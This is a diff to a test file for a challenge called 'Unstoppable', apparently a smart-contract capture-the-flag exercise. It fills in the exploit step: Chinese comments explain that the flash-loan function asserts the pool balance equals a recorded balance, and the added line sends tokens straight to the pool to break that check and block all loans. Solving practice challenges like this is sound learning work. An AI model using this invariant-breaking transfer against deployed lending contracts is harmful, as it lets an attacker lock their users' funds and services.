@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //逻辑问题，在flashLoan里验证了assert(poolBalance == balanceBefore)
+        //如果直接转余额会导致poolBalance不变，但balanceBefore变了
+        await this.token.connect(attacker).transfer(this.pool.address, 10);
     });
 
     after(async function () {
